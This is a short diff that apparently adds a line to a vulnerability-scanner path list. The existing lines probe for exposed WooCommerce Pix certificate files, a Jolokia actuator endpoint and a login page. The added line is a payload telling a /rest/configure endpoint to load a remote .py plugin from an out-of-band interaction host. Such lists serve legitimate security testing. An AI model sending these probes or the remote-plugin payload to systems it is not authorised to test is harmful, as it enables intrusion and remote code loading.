@@ -232,3 +232,4 @@
 /wp-content/plugins/payment-gateway-pix-for-woocommerce/Includes/files/certs_c6/{{fname}}.crt
 /actuator/jolokia/list
 /login.do
+/rest/configure?plugins=http://{{interactsh-url}}/{{randstr}}.py
